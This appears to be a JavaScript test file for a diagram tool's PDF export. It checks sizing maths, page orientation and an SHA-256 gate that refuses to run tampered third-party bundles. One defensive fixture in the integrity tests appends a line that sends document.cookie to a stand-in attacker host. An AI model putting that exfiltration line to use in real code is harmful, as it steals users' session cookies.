// Export sizing maths, and the SHA-256 gate that gets to decide whether a
// third-party bundle is allowed to run. The gate is the security-critical part
// of PDF export, so it is exercised against tampered payloads, a truncated
// payload, a hostile oversized response and a failing server, and the loader is
// checked never to execute anything that failed.
import { JSDOM } from 'jsdom';
import { mkdtempSync, rmSync, cpSync, writeFileSync, symlinkSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import { pathToFileURL } from 'url';
import { webcrypto } from 'crypto';

const dom = new JSDOM('<!doctype html><html><body></body></html>');
globalThis.window = dom.window;
globalThis.document = dom.window.document;

const tmp = mkdtempSync(join(tmpdir(), 'vsdx-esm-export-'));
process.on('exit', () => { try { rmSync(tmp, { recursive: true, force: true }); } catch {} });
cpSync('src', tmp, { recursive: true });
writeFileSync(join(tmp, 'package.json'), JSON.stringify({ type: 'module' }));
symlinkSync(join(process.cwd(), 'node_modules'), join(tmp, 'node_modules'), 'dir');

const scale = await import(pathToFileURL(join(tmp, 'export-scale.js')));
const pdf = await import(pathToFileURL(join(tmp, 'pdf-export.js')));

let pass = 0, fail = 0;
const check = (name, cond, detail = '') => {
  console.log(`  ${cond ? 'PASS ✓' : 'FAIL ✗'} ${name}${cond ? '' : '  ' + detail}`);
  cond ? pass++ : fail++;
};

// ---------------------------------------------------------------------------
console.log('\n1. Sizing');

// A 345in drawing: exactly the shape of the problem this is here to solve.
const BIG_W = 33120, BIG_H = 8640;

const original = scale.computeExportSize(BIG_W, BIG_H, 'original');
check('original size is left alone', original.scale === 1 && original.width === BIG_W, JSON.stringify(original));
check('original size is beyond what a PDF page can hold', original.exceedsPdfLimit === true,
  `${original.widthPt}pt vs limit ${scale.PDF_MAX_PT}`);

const viewer = scale.computeExportSize(BIG_W, BIG_H, 'viewer');
check('viewer-safe caps the longest side at 19200px', viewer.width === scale.PDF_MAX_PX, String(viewer.width));
check('viewer-safe fits inside a PDF page', viewer.exceedsPdfLimit === false, `${viewer.widthPt}pt`);
check('viewer-safe is exactly 14400pt wide', viewer.widthPt === scale.PDF_MAX_PT, String(viewer.widthPt));
check('viewer-safe keeps the aspect ratio',
  Math.abs(viewer.width / viewer.height - BIG_W / BIG_H) < 1e-6,
  `${viewer.width}/${viewer.height}`);

const screen = scale.computeExportSize(BIG_W, BIG_H, 'screen');
check('screen caps the longest side at 4096px', screen.width === 4096, String(screen.width));

// A tall drawing must be capped on its height, not blindly on its width.
const tall = scale.computeExportSize(2000, 40000, 'viewer');
check('the longest side is the one that gets capped', tall.height === scale.PDF_MAX_PX, JSON.stringify(tall));

// Presets are ceilings, not magnifiers.
const small = scale.computeExportSize(800, 600, 'viewer');
check('a small drawing is not blown up to fill the budget', small.scale === 1 && small.width === 800, JSON.stringify(small));

const custom = scale.computeExportSize(BIG_W, BIG_H, 'custom', { customPx: 8000 });
check('custom longest side is honoured', custom.width === 8000, String(custom.width));
const customUp = scale.computeExportSize(800, 600, 'custom', { customPx: 4000 });
check('an explicit custom size may enlarge', customUp.width === 4000 && customUp.scale === 5, JSON.stringify(customUp));
const customJunk = scale.computeExportSize(BIG_W, BIG_H, 'custom', { customPx: -3 });
check('a nonsense custom size falls back to original', customJunk.scale === 1, JSON.stringify(customJunk));

check('a missing drawing does not throw', scale.computeExportSize(0, 0, 'viewer').width === 0);
check('NaN dimensions do not throw', scale.computeExportSize(NaN, NaN, 'viewer').scale === 1);

check('a big drawing opens the dialog on viewer-safe', scale.defaultSizeMode(BIG_W, BIG_H) === 'viewer');
check('a normal drawing opens the dialog on original', scale.defaultSizeMode(1200, 900) === 'original');

check('the summary spells out the change',
  /^33120 × 8640px → 19200 × 5009px \(200 × 52\.17in\) at 57\.97%$/.test(scale.describeExportSize(viewer)),
  scale.describeExportSize(viewer));
check('an unchanged export says so', /unchanged/.test(scale.describeExportSize(original)),
  scale.describeExportSize(original));

// ---------------------------------------------------------------------------
console.log('\n2. Rescaling touches metadata only');

const svgNS = 'http://www.w3.org/2000/svg';
const svg = document.createElementNS(svgNS, 'svg');
svg.setAttribute('viewBox', `0 0 ${BIG_W} ${BIG_H}`);
svg.setAttribute('width', '100%');
svg.setAttribute('height', '100%');
svg.style.maxWidth = BIG_W + 'px';
const child = document.createElementNS(svgNS, 'path');
child.setAttribute('d', 'M 0 0 L 33120 8640');
svg.appendChild(child);

check('the viewBox reads back as the drawing size',
  scale.svgViewBoxSize(svg).width === BIG_W && scale.svgViewBoxSize(svg).height === BIG_H);

scale.applyExportSize(svg, viewer);
check('the export gets a real intrinsic width', svg.getAttribute('width') === String(viewer.width), svg.getAttribute('width'));
check('the export gets a real intrinsic height', svg.getAttribute('height') === String(viewer.height), svg.getAttribute('height'));
check('the viewBox is left at full precision', svg.getAttribute('viewBox') === `0 0 ${BIG_W} ${BIG_H}`, svg.getAttribute('viewBox'));
check('geometry is untouched', child.getAttribute('d') === 'M 0 0 L 33120 8640');
check('the viewer max-width no longer fights the new size',
  !/max-width/.test(svg.getAttribute('style') || ''), svg.getAttribute('style') || '(none)');

// ---------------------------------------------------------------------------
console.log('\n3. The SHA-256 gate');

const subtle = webcrypto.subtle;
const GOOD = 'globalThis.__pinnedRan = (globalThis.__pinnedRan || 0) + 1;';
const goodHash = await pdf.sha256Hex(new TextEncoder().encode(GOOD), subtle);
const lib = { name: 'fixture', version: '1.0.0', global: '__pinnedRan', url: 'https://example.test/fixture.js', sha256: goodHash };

const serve = (body, init = {}) => async () => ({
  ok: init.ok !== false,
  status: init.status || 200,
  arrayBuffer: async () => new TextEncoder().encode(body).buffer,
});

const okSource = await pdf.fetchPinned(lib, { fetchImpl: serve(GOOD), subtle });
check('a matching payload is returned verbatim', okSource === GOOD);

// The whole point: a CDN that serves something else must not run.
let rejected = null;
try {
  await pdf.fetchPinned(lib, { fetchImpl: serve(GOOD + 'fetch("https://evil.test/"+document.cookie);'), subtle });
} catch (e) { rejected = e; }
check('a tampered payload is rejected', rejected?.name === 'IntegrityError', String(rejected));
check('the rejection names the library and both digests',
  rejected && rejected.message.includes(goodHash) && rejected.message.includes(rejected.actual) && rejected.message.includes('fixture'),
  rejected?.message);

// A single flipped byte — no leniency, no prefix matching.
rejected = null;
try {
  await pdf.fetchPinned(lib, { fetchImpl: serve(GOOD.replace(';', ' ;')), subtle });
} catch (e) { rejected = e; }
check('a one-character difference is rejected', rejected?.name === 'IntegrityError');

// Truncation must fail too — a hash is not a length check.
rejected = null;
try {
  await pdf.fetchPinned(lib, { fetchImpl: serve(GOOD.slice(0, -5)), subtle });
} catch (e) { rejected = e; }
check('a truncated payload is rejected', rejected?.name === 'IntegrityError');

rejected = null;
try {
  await pdf.fetchPinned(lib, { fetchImpl: serve('x'.repeat(5 * 1024 * 1024)), subtle });
} catch (e) { rejected = e; }
check('an implausibly large response is refused before hashing',
  rejected && /implausibly large/.test(rejected.message), rejected?.message);

rejected = null;
try {
  await pdf.fetchPinned(lib, { fetchImpl: serve('', { ok: false, status: 503 }), subtle });
} catch (e) { rejected = e; }
check('an HTTP failure is reported plainly', rejected && /HTTP 503/.test(rejected.message), rejected?.message);

// ---------------------------------------------------------------------------
console.log('\n4. The loader never runs unverified code');

const makeScope = () => ({ Function: globalThis.Function });

// Bad first library: nothing runs, and the error propagates.
let ran = [];
let scope = makeScope();
pdf.resetPdfLibraries();
rejected = null;
try {
  await pdf.loadPdfLibraries({
    scope,
    subtle,
    fetchImpl: serve('/* not the real jsPDF */'),
    run: (src) => ran.push(src),
  });
} catch (e) { rejected = e; }
check('a failed digest aborts the load', rejected?.name === 'IntegrityError', String(rejected));
check('nothing was executed', ran.length === 0, JSON.stringify(ran));
check('the second library was never even fetched', ran.length === 0);

// A failed load must not poison later attempts (a dropped connection deserves
// a retry), so the cached promise is cleared on failure.
pdf.resetPdfLibraries();
ran = [];
scope = makeScope();
const bodies = new Map(pdf.PINNED_LIBS.map(l => [l.url, `globalThis.__x=1;/*${l.name}*/`]));
// Serve payloads whose digests we compute on the fly, so this exercises the
// real PINNED_LIBS list without downloading half a megabyte.
const realHashes = new Map();
for (const l of pdf.PINNED_LIBS) realHashes.set(l.url, await pdf.sha256Hex(new TextEncoder().encode(bodies.get(l.url)), subtle));
const patched = pdf.PINNED_LIBS.map(l => ({ ...l, sha256: realHashes.get(l.url) }));
const originalPins = pdf.PINNED_LIBS.slice();
pdf.PINNED_LIBS.length = 0;
pdf.PINNED_LIBS.push(...patched);

const progress = [];
await pdf.loadPdfLibraries({
  scope,
  subtle,
  fetchImpl: async (url) => ({ ok: true, status: 200, arrayBuffer: async () => new TextEncoder().encode(bodies.get(url)).buffer }),
  run: (src, url) => { ran.push(url); scope[pdf.PINNED_LIBS.find(l => l.url === url).global] = {}; },
  onProgress: (m) => progress.push(m),
});
check('both libraries run once their digests match', ran.length === 2, JSON.stringify(ran));
check('jsPDF is loaded before svg2pdf.js, which extends it', /jspdf/.test(ran[0]) && /svg2pdf/.test(ran[1]), JSON.stringify(ran));
check('progress is reported per library', progress.some(m => /Verified/.test(m)), JSON.stringify(progress));

pdf.PINNED_LIBS.length = 0;
pdf.PINNED_LIBS.push(...originalPins);
pdf.resetPdfLibraries();

check('the pinned digests are full-length hex',
  pdf.PINNED_LIBS.every(l => /^[0-9a-f]{64}$/.test(l.sha256)),
  JSON.stringify(pdf.PINNED_LIBS.map(l => l.sha256)));
check('the pinned URLs are version-locked https',
  pdf.PINNED_LIBS.every(l => l.url.startsWith('https://') && /@\d+\.\d+\.\d+\//.test(l.url)),
  JSON.stringify(pdf.PINNED_LIBS.map(l => l.url)));

// ---------------------------------------------------------------------------
console.log('\n5. The PDF page matches the drawing\'s shape');

// jsPDF quietly reorders `format` to agree with `orientation` — portrait forces
// width ≤ height, landscape forces width ≥ height. Asking for the wrong one
// gives a tall page for a wide drawing and renders most of it off the edge,
// which is exactly what a 345×90in drawing does. Stub the constructor and check
// what it is actually asked for.
const built = [];
const stubScope = {
  jspdf: {
    jsPDF: class {
      constructor(opts) { built.push(opts); }
      svg() { return Promise.resolve(); }
      output() { return { type: 'application/pdf' }; }
    },
  },
};

await pdf.svgToPdfBlob({}, { widthPt: 14400, heightPt: 3756.52, scope: stubScope });
check('a wide drawing asks for a landscape page', built.at(-1).orientation === 'landscape', JSON.stringify(built.at(-1)));
check('…keeping the wide side wide', built.at(-1).format[0] > built.at(-1).format[1], JSON.stringify(built.at(-1).format));

await pdf.svgToPdfBlob({}, { widthPt: 595.28, heightPt: 841.89, scope: stubScope });
check('a tall drawing asks for a portrait page', built.at(-1).orientation === 'portrait', JSON.stringify(built.at(-1)));
check('…keeping the tall side tall', built.at(-1).format[1] > built.at(-1).format[0], JSON.stringify(built.at(-1).format));

check('the page is always in points', built.every(o => o.unit === 'pt'));

let sizeError = null;
try { await pdf.svgToPdfBlob({}, { widthPt: 0, heightPt: 100, scope: stubScope }); } catch (e) { sizeError = e; }
check('a zero-sized page is refused', /must be positive/.test(sizeError?.message || ''), String(sizeError));

let missing = null;
try { await pdf.svgToPdfBlob({}, { widthPt: 10, heightPt: 10, scope: {} }); } catch (e) { missing = e; }
check('converting without jsPDF loaded is refused', /jsPDF is not loaded/.test(missing?.message || ''), String(missing));

console.log(`\nexport-scale: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
